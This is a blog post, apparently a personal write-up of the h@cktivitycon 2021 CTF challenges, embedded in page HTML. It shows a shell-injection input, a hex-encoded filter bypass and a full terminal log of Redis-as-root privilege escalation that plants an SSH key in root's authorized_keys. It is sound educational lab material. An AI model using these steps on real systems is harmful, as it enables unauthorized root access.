<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>h@cktivitycon 2021 CTF | pshegger&#39;s blog</title>
<meta name="keywords" content="ctf, writeup, hacktivitycon, hackerone, cryptography, python">
<meta name="description" content="Writeups and my thoughts about the 2021 h@cktivitycon CTF">
<meta name="author" content="pshegger">
<link rel="canonical" href="https://pshegger.github.io/posts/hacktivitycon-2021-ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://pshegger.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pshegger.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://pshegger.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://pshegger.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://pshegger.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://pshegger.github.io/posts/hacktivitycon-2021-ctf/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-NKBPT9CS94"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-NKBPT9CS94');
        }
      </script><meta property="og:url" content="https://pshegger.github.io/posts/hacktivitycon-2021-ctf/">
  <meta property="og:site_name" content="pshegger&#39;s blog">
  <meta property="og:title" content="h@cktivitycon 2021 CTF">
  <meta property="og:description" content="Writeups and my thoughts about the 2021 h@cktivitycon CTF">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-09-20T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-09-20T00:00:00+00:00">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Hacktivitycon">
    <meta property="article:tag" content="Hackerone">
    <meta property="article:tag" content="Cryptography">
    <meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="h@cktivitycon 2021 CTF">
<meta name="twitter:description" content="Writeups and my thoughts about the 2021 h@cktivitycon CTF">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://pshegger.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "h@cktivitycon 2021 CTF",
      "item": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "h@cktivitycon 2021 CTF",
  "name": "h@cktivitycon 2021 CTF",
  "description": "Writeups and my thoughts about the 2021 h@cktivitycon CTF",
  "keywords": [
    "ctf", "writeup", "hacktivitycon", "hackerone", "cryptography", "python"
  ],
  "articleBody": "This year’s h@cktivitycon was held last Saturday, but even before it started, there was another event HackerOne had organized: this year’s CTF. It began on Thursday and ran for 48 hours. As I wasn’t following the events, it was already Friday when I realized it was running. I still had a bit more than a day to complete as many challenges as possible, so I decided to register and see how it goes.\nEven though I already had some experience with CTFs, this was my first time participating in an event while it was running. Previously I only tried the challenges after the event had ended, so there was zero time pressure. I’m also not a security professional, most of the challenges are too hard for me, but I hoped I could find a few that I could solve and enjoy. Luckily there were challenges for every skill level, so I could find the ones suitable for me. Let’s see them.\nWarmup It was instantly clear that I should start at the warmup category. These challenges were not too hard, but they were a fun place to begin.\nRead The Rules This was probably the easiest challenge in the whole event. As the title says, you just had to go to the rules page and find the flag in a comment in the page’s source code.\nPimple This challenge started by downloading a file with no extension. I did what I usually do when I have a file, and I don’t know what kind of file is: open it in a hex editor. After a glance at the header, I knew that I had an xcf file in front of me, so I added the extension and opened it in GIMP. I had no idea how to continue from this point, so I just started to show/hide the layers. Luckily, this was all I had to do; I found one with the flag after hiding a few of the top layers.\nBass64 This was also one of the easier challenges. You got a file that turned out to be a simple text file. When I first opened it, it looked like it contained only random characters, but I quickly realized that I had to turn off line wrapping in my text editor to see the content as it was supposed to be seen. After that, I could see the ASCII art for the flag. After reading it, I pasted it into the website, and it was correct.\nTsunami This challenge also started by downloading a file without an extension, so I opened it in a hex editor again. The header proved to be useful again, and it showed that I got a wav file this time. I’ve seen this type of challenge before, so I had a strong feeling that the flag was hidden in the file’s spectrogram. After finding software capable of displaying it, it confirmed my suspicion, and I found the next flag in no time.\n2ez This challenge also started with downloading an unknown file, so I started with my hex editor again. The first thing I realized was the JFIF part in the file header, so I knew it was a jpg file. I also realized that the start of the header was weird, so I opened a random jpg file on my machine and checked it too. It quickly became clear that the first 4 bytes were modified, so I edited them to contain the correct value (0xFF 0xD8 0xFF 0xE0). All that remained was to add the correct extension and open it.\nTarget Practice We also got a file to download for this challenge, but it had a .gif extension this time. When you opened it, you could see concentric circles in the middle and some dots around it. The dots were changing with every frame. I had the suspicion that I was looking at some kind of 2d barcode, but I had to check it. After some googling, I could confirm that I was right, and each frame contained a Maxi Code.\nI wrote a small script to export every frame as a separate file. As the gif contained only 22 frames, I decided to check each one by hand as it would have taken more time to write a script for that. In the end, I found the flag in one of the frames.\n#!/usr/bin/env python3 from PIL import Image with Image.open(\"target_practice.gif\") as im: for i in range(im.n_frames): im.seek(i) im.save(f\"target_practice/frame{i}.gif\") Six Four Over Two For this challenge, the solution was hinted at in the title and in the description (cover all the bases). With these hints, I realized that I was looking at a base32 encoded text, so I decoded it, and that was all I had to do.\nButter Overflow This time the downloadable file was a source code for a small program written in c. After reading it, you could see multiple things:\nthe handler for a segfault calls the give_flag method the program reads input to a buffer with a length of 0x200 the length of the input is not validated With the above information, we can quickly realize that all we have to do is cause a buffer overflow with our input, so I generated a long enough string of as pasted it into the terminal and got the flag.\nWeb Confidentiality For this challenge, we were presented with a website with one input field. The site stated that we could pass any path as input, and it would show the files in the given folder. After trying it with the given example, I had the assumption that the site was running ls -l {user_input} and showed the result. This, of course, would mean that we can use shell injection to run any command on the system, and with that, to get the flag.\nI quickly tried ; ls as an input, and when I got the current working directory listed twice (first for the original ls -l and a second time for my injected ls), it confirmed my assumption. I also saw a file called flag.txt, so I tried getting its content with ; cat flag.txt, which worked, and with that, I had the flag.\nCryptography N1TP After connecting to the service, we got an encrypted string and the opportunity to try the encryption ourselves. After trying it with some random input Nina (the author of the encryption tool) mentions one-time pad. Then I tried another input, but this time instead of an arbitrary string, I used one that had the same format as the flag (flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa} in this case). Comparing the result to the original encrypted string, I realized that the first 10 character was the same in both texts.\nThis made me think that the key is reused for the encryption, so I started to look into attack vectors for this. I quickly found that I could use a technic called Crib Dragging, so I searched for an online version and found this site. After providing the required and known info, the site quickly decrypted the original encrypted text, and with that, I got another flag.\nMobile To Do We had to download an apk file for this challenge and extract the flag from that. I started by installing the app on my phone and running it to get a general idea about how it works. After starting the app, I saw a login screen that asked for the password. At this point, I launched Bytecode Viewer on my computer and opened the apk with it. I navigated to the source of the LoginActivity, and after some reading, I found which class contains the code for checking the password. I opened that file too, and to my surprise, the check was only an if statement with the password in plain text. I went back to the application on my phone and tried the password, and it worked, so I got access to the to-do items stored in the database. The first item was the flag itself, so I submitted it and went on to the next challenge.\nReactor After my success with the previous challenge, I felt like I had to try this too, even though this was a medium-difficulty one, and I completed only easy ones so far. I downloaded the apk, installed it, and was presented with a PIN entry screen. When you entered any code, you got a string that changed with the PIN. This meant that the PIN was probably used as a decryption key for the encrypted flag.\nI opened the apk with Bytecode Viewer again, and after finding the MainActivity, I saw that it’s a subclass of ReactActivity. This meant that we had a React Native application this time, which was unlucky because I couldn’t use my Android knowledge. After some search, I found that the source for the app is in /assets/index.android.bundle. I opened the file, but it was obfuscated, so I took a break before trying to understand it.\nTo pass some time while I was gathering strength for understanding the obfuscated code, I tried various random PINs in the app. I quickly realized that the first character of the resulting decrypted text only depends on the first number in the PIN. After that, I checked if the 2nd character is dependent only on the 2nd number of the PIN or not, and it was. That was also true for the 3rd and 4th characters. This meant that I could guess the numbers 1-by-1, and instead of trying all the 10000 possible combinations, I could find the correct PIN in a maximum of 40 tries.\nWith that knowledge, I started to search by only changing the first digit of the PIN until the output began with an f. After I got the first digit, I repeated the previous step for digits 2-4 until, in the end, I got the correct PIN, and with that, another flag.\nMiscellaneous Bad Words We were presented with a shell in this challenge, and we had to find the flag there. I tried running ls, but it was forbidden because it contained a “bad word”. After trying some other basic commands, I had to realize that all of them were forbidden.\nAt this point, I randomly tried to call ls with its full path (/bin/ls), and to my surprise, it worked. After this, all I had to do was traversing the directory structure using /bin/ls and printing the flag with /bin/cat once I found it.\nuser@host:/home/user$ /bin/cat just/out/of/reach/flag.txt /bin/cat just/out/of/reach/flag.txt flag{2d43e30a358d3f30fe65cc47a9cbbe98} Shelle In this challenge, we got access to a shell with some limitations. We only had a few commands that we could use, but ls was one of them, so I ran it. In the output, I’ve seen that there’s an assignment.txt in the current folder, so I printed it. It was a task list for the students who were supposed to use the system, but it also said that the flag is in /opt. I tried to print the flag using cat, but I got an error that my command contained an illegal character.\nAfter some trial, I found that / was illegal (among a few other characters). I tried to bypass the check by encoding the character, but it wasn’t working at first. After some googling, I found that I have to use the -e flag for echo to enable interpreting backslash-escaped characters (FYI: I’m using Mac OS, and the version of echo there doesn’t require any flag for escaping to work correctly). After this realization, I could craft a command that could print the flag, and it worked flawlessly.\n\u003e cat $(echo -e \"\\x2fopt\\x2fflag.txt\") Redlike This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in /root. I had no idea how to start, so I began to look into basic things after connecting to the remote machine. I’ve seen that the machine is running Ubuntu 20.4 LTS with a recent kernel. I tried to look for local privilege escalations in these but with no luck.\nAfter some search, I stumbled upon this article about a few basic ideas on how to start in these scenarios. I tried the techniques one-by-one, and 2 of them looked like a possible solution. First, I tried to see if I could exploit the cron jobs to create a root shell, but I had no success. After that, my attention shifted to the other possibility. I’d previously seen that there’s a Redis server running as root. In the article, they showed us an example for MySQL running as root, but I thought it was worth trying.\nAfter some research, I found this article explaining how we can use Redis to add our own ssh key to any user’s authorized keys. I followed the steps, and after only a few minutes, I could SSH to localhost as root and read the flag.\nuser@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/user/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:j7Uxe4PP+dP9nO+uvWzTbJUdbN5n2FyckwGXbnTFAyg user@redlike-44e6479a7e6be38a-6559588cdd-ww42g The key\\'s randomart image is: +---[RSA 3072]----+ | .ooo+| | E . .=o| | . +.*| | Xo| | S + ++B| | + * .oO| | . = o +=| | + oo=B| | +.+X%| +----[SHA256]-----+ user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") \u003e foo.txt user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli flushall OK user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ cat foo.txt | redis-cli -x set crackit OK user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli 127.0.0.1:6379\u003e config set dir /root/.ssh/ OK 127.0.0.1:6379\u003e config get dir 1) \"dir\" 2) \"/root/.ssh\" 127.0.0.1:6379\u003e config set dbfilename \"authorized_keys\" OK 127.0.0.1:6379\u003e save OK 127.0.0.1:6379\u003e user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls flag.txt root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt flag{69dc14707af23b728ebd1363715ec890} Scripting Words Church There’s not too much to write about this challenge; we had to find words in a grid. The catch was that we had to find a total of 150 words (with the grid changing after every 5th word), so it would’ve taken too much time to do it by hand. For this reason, I wrote a script that connected to the server, parsed the grid every time we got a new one and searched for the word in the grid with a simple brute force algorithm. You can find the script here.\nOTP Smasher In this challenge, we were presented with a website that contained only an image and a form with one input field. The picture had only a few numbers on a black background. I tried entering the number on the image into the form, and after I submitted it, I got back the same page but with a few changes: a counter number increased by 1, and the image had changed. After checking the Chrome Developer console, I could also see that the site was trying to load flag.png, but the server returned 404. After entering the numbers on the image a few more times, I realized something: the counter sometimes goes up, but sometimes it resets even when I enter the correct number. I assumed that the counter resets when too much time passes between entering two numbers. I didn’t know how many times I had to enter the number, so I wrote a script to automate the task.\nI started by looking into some kind of OCR I could use, and I quickly found Tesseract. I wrote a script to download the image from the server, run OCR on it, and send the recognized number back to the server. This ran in a loop, and every time after it submitted a code, I tried to download the flag. When it was available, I saved it and ended the loop.\nIn theory, it was a good approach, but for some reason, it always failed after solving a few images. After debugging a bit, I saw that Tesseract didn’t recognize the number correctly, so I started to look into solutions to make it more reliable. After searching a bit, I found that I could set a whitelist for characters to be used. I set up the whitelist to only contain the numbers 0-9, but the recognition was still unreliable even after that.\nAfter trying a few things (settings various recognition options, cropping the picture to only contain the numbers), I found the correct solution: I had to invert the colors of the image so that the background becomes white and the text on it becomes black (I used ImageMagick for this). This simple change instantly solved all my problems. In the end, I needed two commands to get the number from the image:\ninvert the colors of the image: convert otp.png -channel RGB -negate otp.png run OCR on the image: tesseract -l eng otp.png otp -c tessedit_char_whitelist=0123456789 You can find the full script here.\nConclusions In the end, I solved 17 challenges, mainly the easy ones, but I managed to solve 5 medium ones too. 4 of these medium ones wasn’t solved by enough people to have their score reduced to the minimum 50 points, so I’m delighted that I managed to do them.\nI got 1838 points, and with that, my team (with me being the only member in it) finished at 186th place (out of 1721 teams).\nI think this is a pretty good result for my first CTF, and it encourages me to participate in other ones in the future. In the past, I was reluctant to these events because I was afraid that my knowledge was not enough to enjoy it. After this one, I see that even if I cannot solve a challenge, I can still enjoy it and learn a lot, especially that it makes me want to know the solutions and read the writeups after the event has ended.\n",
  "wordCount" : "3083",
  "inLanguage": "en",
  "datePublished": "2021-09-20T00:00:00Z",
  "dateModified": "2021-09-20T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "pshegger"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "pshegger's blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pshegger.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pshegger.github.io/" accesskey="h" title="pshegger&#39;s blog (Alt + H)">pshegger&#39;s blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pshegger.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://pshegger.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      h@cktivitycon 2021 CTF
    </h1>
    <div class="post-description">
      Writeups and my thoughts about the 2021 h@cktivitycon CTF
    </div>
    <div class="post-meta"><span title='2021-09-20 00:00:00 +0000 UTC'>September 20, 2021</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;pshegger

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#warmup" aria-label="Warmup">Warmup</a><ul>
                        
                <li>
                    <a href="#read-the-rules" aria-label="Read The Rules">Read The Rules</a></li>
                <li>
                    <a href="#pimple" aria-label="Pimple">Pimple</a></li>
                <li>
                    <a href="#bass64" aria-label="Bass64">Bass64</a></li>
                <li>
                    <a href="#tsunami" aria-label="Tsunami">Tsunami</a></li>
                <li>
                    <a href="#2ez" aria-label="2ez">2ez</a></li>
                <li>
                    <a href="#target-practice" aria-label="Target Practice">Target Practice</a></li>
                <li>
                    <a href="#six-four-over-two" aria-label="Six Four Over Two">Six Four Over Two</a></li>
                <li>
                    <a href="#butter-overflow" aria-label="Butter Overflow">Butter Overflow</a></li></ul>
                </li>
                <li>
                    <a href="#web" aria-label="Web">Web</a><ul>
                        
                <li>
                    <a href="#confidentiality" aria-label="Confidentiality">Confidentiality</a></li></ul>
                </li>
                <li>
                    <a href="#cryptography" aria-label="Cryptography">Cryptography</a><ul>
                        
                <li>
                    <a href="#n1tp" aria-label="N1TP">N1TP</a></li></ul>
                </li>
                <li>
                    <a href="#mobile" aria-label="Mobile">Mobile</a><ul>
                        
                <li>
                    <a href="#to-do" aria-label="To Do">To Do</a></li>
                <li>
                    <a href="#reactor" aria-label="Reactor">Reactor</a></li></ul>
                </li>
                <li>
                    <a href="#miscellaneous" aria-label="Miscellaneous">Miscellaneous</a><ul>
                        
                <li>
                    <a href="#bad-words" aria-label="Bad Words">Bad Words</a></li>
                <li>
                    <a href="#shelle" aria-label="Shelle">Shelle</a></li>
                <li>
                    <a href="#redlike" aria-label="Redlike">Redlike</a></li></ul>
                </li>
                <li>
                    <a href="#scripting" aria-label="Scripting">Scripting</a><ul>
                        
                <li>
                    <a href="#words-church" aria-label="Words Church">Words Church</a></li>
                <li>
                    <a href="#otp-smasher" aria-label="OTP Smasher">OTP Smasher</a></li></ul>
                </li>
                <li>
                    <a href="#conclusions" aria-label="Conclusions">Conclusions</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>This year’s <a href="https://www.hackerone.com/hacktivitycon">h@cktivitycon</a> was held last Saturday, but even before it started, there was another event HackerOne had organized: this year’s CTF. It began on Thursday and ran for 48 hours. As I wasn’t following the events, it was already Friday when I realized it was running. I still had a bit more than a day to complete as many challenges as possible, so I decided to register and see how it goes.</p>
<p>Even though I already had some experience with CTFs, this was my first time participating in an event while it was running. Previously I only tried the challenges after the event had ended, so there was zero time pressure. I’m also not a security professional, most of the challenges are too hard for me, but I hoped I could find a few that I could solve and enjoy. Luckily there were challenges for every skill level, so I could find the ones suitable for me. Let’s see them.</p>
<h2 id="warmup">Warmup<a hidden class="anchor" aria-hidden="true" href="#warmup">#</a></h2>
<p>It was instantly clear that I should start at the warmup category. These challenges were not too hard, but they were a fun place to begin.</p>
<h3 id="read-the-rules">Read The Rules<a hidden class="anchor" aria-hidden="true" href="#read-the-rules">#</a></h3>
<p>This was probably the easiest challenge in the whole event. As the title says, you just had to go to the rules page and find the flag in a comment in the page&rsquo;s source code.</p>
<h3 id="pimple">Pimple<a hidden class="anchor" aria-hidden="true" href="#pimple">#</a></h3>
<p>This challenge started by downloading a file with no extension. I did what I usually do when I have a file, and I don’t know what kind of file is: open it in a hex editor. After a glance at the header, I knew that I had an <code>xcf</code> file in front of me, so I added the extension and opened it in GIMP. I had no idea how to continue from this point, so I just started to show/hide the layers. Luckily, this was all I had to do; I found one with the flag after hiding a few of the top layers.</p>
<h3 id="bass64">Bass64<a hidden class="anchor" aria-hidden="true" href="#bass64">#</a></h3>
<p>This was also one of the easier challenges. You got a file that turned out to be a simple text file. When I first opened it, it looked like it contained only random characters, but I quickly realized that I had to turn off line wrapping in my text editor to see the content as it was supposed to be seen. After that, I could see the ASCII art for the flag. After reading it, I pasted it into the website, and it was correct.</p>
<h3 id="tsunami">Tsunami<a hidden class="anchor" aria-hidden="true" href="#tsunami">#</a></h3>
<p>This challenge also started by downloading a file without an extension, so I opened it in a hex editor again. The header proved to be useful again, and it showed that I got a <code>wav</code> file this time. I&rsquo;ve seen this type of challenge before, so I had a strong feeling that the flag was hidden in the file&rsquo;s spectrogram. After finding software capable of displaying it, it confirmed my suspicion, and I found the next flag in no time.</p>
<h3 id="2ez">2ez<a hidden class="anchor" aria-hidden="true" href="#2ez">#</a></h3>
<p>This challenge also started with downloading an unknown file, so I started with my hex editor again. The first thing I realized was the <code>JFIF</code> part in the file header, so I knew it was a jpg file. I also realized that the start of the header was weird, so I opened a random jpg file on my machine and checked it too. It quickly became clear that the first 4 bytes were modified, so I edited them to contain the correct value (<code>0xFF 0xD8 0xFF 0xE0</code>). All that remained was to add the correct extension and open it.</p>
<h3 id="target-practice">Target Practice<a hidden class="anchor" aria-hidden="true" href="#target-practice">#</a></h3>
<p>We also got a file to download for this challenge, but it had a <code>.gif</code> extension this time. When you opened it, you could see concentric circles in the middle and some dots around it. The dots were changing with every frame. I had the suspicion that I was looking at some kind of 2d barcode, but I had to check it. After some googling, I could confirm that I was right, and each frame contained a Maxi Code.</p>
<p>I wrote a small script to export every frame as a separate file. As the gif contained only 22 frames, I decided to check each one by hand as it would have taken more time to write a script for that. In the end, I found the flag in one of the frames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;target_practice.gif&#34;</span>) <span style="color:#66d9ef">as</span> im:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(im<span style="color:#f92672">.</span>n_frames):
</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>seek(i)
</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target_practice/frame</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">.gif&#34;</span>)
</span></span></code></pre></div><h3 id="six-four-over-two">Six Four Over Two<a hidden class="anchor" aria-hidden="true" href="#six-four-over-two">#</a></h3>
<p>For this challenge, the solution was hinted at in the title and in the description (<code>cover all the bases</code>). With these hints, I realized that I was looking at a <code>base32</code> encoded text, so I decoded it, and that was all I had to do.</p>
<h3 id="butter-overflow">Butter Overflow<a hidden class="anchor" aria-hidden="true" href="#butter-overflow">#</a></h3>
<p>This time the downloadable file was a source code for a small program written in c. After reading it, you could see multiple things:</p>
<ol>
<li>the handler for a segfault calls the <code>give_flag</code> method</li>
<li>the program reads input to a buffer with a length of <code>0x200</code></li>
<li>the length of the input is not validated</li>
</ol>
<p>With the above information, we can quickly realize that all we have to do is cause a buffer overflow with our input, so I generated a long enough string of <code>a</code>s pasted it into the terminal and got the flag.</p>
<h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
<h3 id="confidentiality">Confidentiality<a hidden class="anchor" aria-hidden="true" href="#confidentiality">#</a></h3>
<p>For this challenge, we were presented with a website with one input field. The site stated that we could pass any path as input, and it would show the files in the given folder. After trying it with the given example, I had the assumption that the site was running <code>ls -l {user_input}</code> and showed the result. This, of course, would mean that we can use shell injection to run any command on the system, and with that, to get the flag.</p>
<p>I quickly tried <code>; ls</code> as an input, and when I got the current working directory listed twice (first for the original <code>ls -l</code> and a second time for my injected <code>ls</code>), it confirmed my assumption. I also saw a file called <code>flag.txt</code>, so I tried getting its content with <code>; cat flag.txt</code>, which worked, and with that, I had the flag.</p>
<h2 id="cryptography">Cryptography<a hidden class="anchor" aria-hidden="true" href="#cryptography">#</a></h2>
<h3 id="n1tp">N1TP<a hidden class="anchor" aria-hidden="true" href="#n1tp">#</a></h3>
<p>After connecting to the service, we got an encrypted string and the opportunity to try the encryption ourselves. After trying it with some random input Nina (the author of the encryption tool) mentions one-time pad. Then I tried another input, but this time instead of an arbitrary string, I used one that had the same format as the flag (<code>flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}</code> in this case). Comparing the result to the original encrypted string, I realized that the first 10 character was the same in both texts.</p>
<p>This made me think that the key is reused for the encryption, so I started to look into attack vectors for this. I quickly found that I could use a technic called <code>Crib Dragging</code>, so I searched for an online version and found <a href="http://cribdrag.com/">this</a> site. After providing the required and known info, the site quickly decrypted the original encrypted text, and with that, I got another flag.</p>
<h2 id="mobile">Mobile<a hidden class="anchor" aria-hidden="true" href="#mobile">#</a></h2>
<h3 id="to-do">To Do<a hidden class="anchor" aria-hidden="true" href="#to-do">#</a></h3>
<p>We had to download an <code>apk</code> file for this challenge and extract the flag from that. I started by installing the app on my phone and running it to get a general idea about how it works. After starting the app, I saw a login screen that asked for the password. At this point, I launched <a href="https://github.com/Konloch/bytecode-viewer">Bytecode Viewer</a> on my computer and opened the apk with it. I navigated to the source of the <code>LoginActivity</code>, and after some reading, I found which class contains the code for checking the password. I opened that file too, and to my surprise, the check was only an if statement with the password in plain text. I went back to the application on my phone and tried the password, and it worked, so I got access to the to-do items stored in the database. The first item was the flag itself, so I submitted it and went on to the next challenge.</p>
<h3 id="reactor">Reactor<a hidden class="anchor" aria-hidden="true" href="#reactor">#</a></h3>
<p>After my success with the previous challenge, I felt like I had to try this too, even though this was a medium-difficulty one, and I completed only easy ones so far. I downloaded the apk, installed it, and was presented with a PIN entry screen. When you entered any code, you got a string that changed with the PIN. This meant that the PIN was probably used as a decryption key for the encrypted flag.</p>
<p>I opened the apk with Bytecode Viewer again, and after finding the <code>MainActivity</code>, I saw that it&rsquo;s a subclass of <code>ReactActivity</code>. This meant that we had a React Native application this time, which was unlucky because I couldn&rsquo;t use my Android knowledge. After some search, I found that the source for the app is in <code>/assets/index.android.bundle</code>. I opened the file, but it was obfuscated, so I took a break before trying to understand it.</p>
<p>To pass some time while I was gathering strength for understanding the obfuscated code, I tried various random PINs in the app. I quickly realized that the first character of the resulting decrypted text only depends on the first number in the PIN. After that, I checked if the 2nd character is dependent only on the 2nd number of the PIN or not, and it was. That was also true for the 3rd and 4th characters. This meant that I could guess the numbers 1-by-1, and instead of trying all the 10000 possible combinations, I could find the correct PIN in a maximum of 40 tries.</p>
<p>With that knowledge, I started to search by only changing the first digit of the PIN until the output began with an <code>f</code>. After I got the first digit, I repeated the previous step for digits 2-4 until, in the end, I got the correct PIN, and with that, another flag.</p>
